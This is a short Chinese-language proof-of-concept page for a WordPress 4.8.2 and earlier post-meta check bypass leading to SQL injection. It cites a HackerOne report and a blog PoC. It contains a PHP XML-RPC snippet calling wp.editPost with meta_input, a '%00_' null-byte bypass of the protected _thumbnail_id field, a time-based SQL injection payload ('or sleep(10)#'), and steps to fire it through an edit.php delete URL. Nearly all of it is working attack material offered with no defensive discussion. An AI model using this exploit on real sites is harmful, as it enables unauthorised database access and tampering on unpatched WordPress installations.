# WordPress ≤ 4.8.2 POST META 校验绕过漏洞
## From
* WordPress post meta data checks bypass[https://hackerone.com/reports/265484](https://hackerone.com/reports/265484)
* WordPress <= 4.8.2 SQL Injection POC[http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/](http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/)
## POC
```php
    $usr = 'author';
    $pwd = 'author';
    $xmlrpc = 'http://local.target/xmlrpc.php';
    $client = new IXR_Client($xmlrpc);
    $content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"xxx"));
    $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);
```
### 用`%00_`来bypass

### STEP

* Add New Custom Field, Name:_thumbnail_id Value:`55 %1$%s or sleep(10)#`
* Click Add Custom Field button.
* Modify the HTTP request, `_thumbnail_id => %00_thumbnail_id`
* Launch the attack. Visit `/wp-admin/edit.php?action=delete&_wpnonce=xxx&ids=55 %1$%s or sleep(10)#.`
